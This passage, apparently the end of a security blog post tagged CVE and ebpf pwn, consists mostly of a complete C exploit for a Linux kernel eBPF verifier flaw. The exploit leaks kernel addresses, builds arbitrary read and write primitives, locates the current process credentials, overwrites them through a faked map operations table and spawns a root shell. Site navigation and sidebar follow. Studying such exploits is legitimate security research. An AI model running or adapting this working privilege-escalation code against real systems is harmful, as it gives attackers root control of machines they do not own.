0xffffffff82e1b400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82e88f20</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VULN_REG    BPF_REG_6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, __dst_reg)                   \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* get a pointer to bpf_array */</span>                \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span></span><br><span class="line"><span class="meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, __idx),        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* mov the result back and clear R0 */</span>          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(__dst_reg, BPF_REG_0),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* load value into r2, make it part-unknown */</span>  \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* r3 = 0x100000002 */</span>                          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* triger the vulnerability */</span>                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAKE_VULN_REG(__map_fd)                           \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* load value into r3, make it [0, 1] under 32 bit */</span> \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8),   \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),     \</span></span><br><span class="line"><span class="meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                      \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),      \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),            \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEAK_MAP_OPS(__map_fd)                             \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* extend the alu-&gt;limit and do the oob read */</span>    \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7),    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),         \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),         \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),      \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),       \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),      \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7),    \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEAK_MAP_ADDR(__map_fd)                         \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span></span><br><span class="line"><span class="meta">        BPF_MOV32_REG(VULN_REG, VULN_REG),              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* extend the alu-&gt;limit and do the oob read */</span>     \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7),     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),             \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* write the value into bpf_map-&gt;btf */</span>             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8), \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),            \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)                  \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* extend the alu_limit */</span>                          \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7),     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                 \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite spin_lock_off */</span>                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),                   \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),        \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite max_entries */</span>                         \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),               \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),        \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite map_type */</span>                            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                       \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),        \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite the map-&gt;ops */</span>                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4),     \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),       \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_ops_addr;</span><br><span class="line"><span class="keyword">size_t</span> map_addr;</span><br><span class="line"><span class="keyword">size_t</span> map_ops_addr;</span><br><span class="line"><span class="keyword">size_t</span> current_task;</span><br><span class="line"><span class="keyword">size_t</span> current_cred;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">read_arbitrary_addr_4_bytes</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> data;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">        TRIGGER_VULN(map_fd),</span><br><span class="line">        MAKE_VULN_REG(map_fd),</span><br><span class="line">        READ_ARBITRARY_ADDR(map_fd, idx),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    ret = run_bpf_prog(prog, <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]), <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .info.bpf_fd = map_fd,</span><br><span class="line">        .info.info_len = <span class="keyword">sizeof</span>(info),</span><br><span class="line">        .info.info = (<span class="keyword">uint64_t</span>)&amp;info,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    data = info.btf_id;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">read_arbitrary_addr</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">size_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> data;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> value[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    key = <span class="number">1</span>;</span><br><span class="line">    value[<span class="number">0</span>] = addr;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to load value into map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    key = <span class="number">2</span>;</span><br><span class="line">    value[<span class="number">0</span>] = addr + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to load value into map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    data = read_arbitrary_addr_4_bytes(map_fd, <span class="number">2</span>);</span><br><span class="line">    data &lt;&lt;= <span class="number">32</span>;</span><br><span class="line">    data += read_arbitrary_addr_4_bytes(map_fd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">make_arbitrary_write_ops</span><span class="params">(<span class="keyword">int</span> map_fd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">        TRIGGER_VULN(map_fd),</span><br><span class="line">        MAKE_VULN_REG(map_fd),</span><br><span class="line">        MAKE_ARBITRARY_WRITE_OPS(map_fd),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> per_ops_ptr, value[<span class="number">0x1000</span>], value_idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops_data</span>;</span></span><br><span class="line"></span><br><span class="line">    fake_ops_addr = map_addr + <span class="number">0x110</span> + MAP_SIZE; <span class="comment">/* save fake ops addr into map */</span></span><br><span class="line"></span><br><span class="line">    value_idx = <span class="number">0</span>; <span class="comment">/* read ops */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(struct bpf_map_ops); i += <span class="number">8</span>)&#123;</span><br><span class="line">        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);</span><br><span class="line">        value[value_idx++] = per_ops_ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ops_data = (struct bpf_map_ops *)value; <span class="comment">/* load ops */</span></span><br><span class="line">    ops_data-&gt;map_push_elem = (<span class="keyword">void</span> *)(ARRAY_MAP_GET_NEXT_KEY + kernel_offset);</span><br><span class="line">    key = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="number">0</span>], <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to look up value!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key = <span class="number">2</span>;</span><br><span class="line">    value[<span class="number">0</span>] = fake_ops_addr;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="number">0</span>], <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to look up value!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_bpf_prog(prog, <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]), <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">void</span> *p, <span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(size % <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i += <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%04x :  %02X %02X %02X %02X %02X %02X %02X %02X     0x%lx\n&quot;</span>, </span><br><span class="line">                i, buf[i+<span class="number">0</span>], buf[i+<span class="number">1</span>], buf[i+<span class="number">2</span>], buf[i+<span class="number">3</span>], buf[i+<span class="number">4</span>], buf[i+<span class="number">5</span>], buf[i+<span class="number">6</span>], buf[i+<span class="number">7</span>], *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> map_fd;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> value[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> log_fd;</span><br><span class="line"></span><br><span class="line">    map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="number">4</span>, MAP_SIZE, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">if</span> (map_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create eBPF map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key = <span class="number">0</span>;</span><br><span class="line">    value[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to load value into map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leak map_ops_addr&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">        TRIGGER_VULN(map_fd),</span><br><span class="line">        MAKE_VULN_REG(map_fd),</span><br><span class="line">        LEAK_MAP_OPS(map_fd),</span><br><span class="line">        BPF_EXIT_INSN()</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span>(run_bpf_prog(prog, <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]), <span class="number">1</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to run bpf prog!&quot;</span>);  </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    key = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to look up value!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    print_hex(value,<span class="number">0x10</span>);</span><br><span class="line">    map_ops_addr = value[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ops_addr: 0x%lx\n&quot;</span>, map_ops_addr);</span><br><span class="line"></span><br><span class="line">    kernel_offset = map_ops_addr - ARRAY_MAP_OPS;</span><br><span class="line">    kernel_base += kernel_offset;</span><br><span class="line">    init_cred = INIT_CRED + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ops_addr: 0x%lx\n&quot;</span>, map_ops_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset: 0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leak map_addr&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog2</span>[] =</span> &#123;</span><br><span class="line">        TRIGGER_VULN(map_fd),</span><br><span class="line">        LEAK_MAP_ADDR(map_fd),</span><br><span class="line">        BPF_EXIT_INSN()</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span>(run_bpf_prog(prog2, <span class="keyword">sizeof</span>(prog2) / <span class="keyword">sizeof</span>(prog2[<span class="number">0</span>]), <span class="number">1</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to run bpf prog!&quot;</span>);  </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    key = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to look up value!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    print_hex(value,<span class="number">0x10</span>);</span><br><span class="line">    map_addr = value[<span class="number">0</span>] - <span class="number">0x110</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_addr: 0x%lx\n&quot;</span>, map_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> next_task = INIT_TASK + kernel_offset + <span class="number">0x818</span>;</span><br><span class="line">    <span class="keyword">size_t</span> data;</span><br><span class="line"></span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;11111111&quot;</span>);</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        next_task = read_arbitrary_addr(map_fd, next_task);</span><br><span class="line">        data = read_arbitrary_addr(map_fd, next_task + <span class="number">0x2d0</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (data != *(<span class="keyword">size_t</span> *)<span class="string">&quot;11111111&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_task = next_task - <span class="number">0x818</span>;</span><br><span class="line">    current_cred = read_arbitrary_addr(map_fd, current_task + <span class="number">0xad8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;current_task: 0x%lx\n&quot;</span>, current_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;current_cred: 0x%lx\n&quot;</span>, current_cred);</span><br><span class="line"></span><br><span class="line">    make_arbitrary_write_ops(map_fd);</span><br><span class="line"></span><br><span class="line">    key = <span class="number">0</span>;</span><br><span class="line">    value[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="number">0</span>], current_cred + <span class="number">4</span> + <span class="number">4</span> * i) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to ovwerwrite no.%d\033[0m\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to call ops-&gt;map_push_elem()!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    get_root_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/CVE/" rel="tag"><i class="fa fa-tag"></i> CVE</a>
              <a href="/tags/ebpf-pwn/" rel="tag"><i class="fa fa-tag"></i> ebpf pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/11/21/Principles%EF%BC%9A%E6%B2%99%E7%9B%92%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" rel="prev" title="Principles：沙盒底层原理">
      <i class="fa fa-chevron-left"></i> Principles：沙盒底层原理
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/11/28/N1CTF2023/" rel="next" title="N1CTF2023">
      N1CTF2023 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">330</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
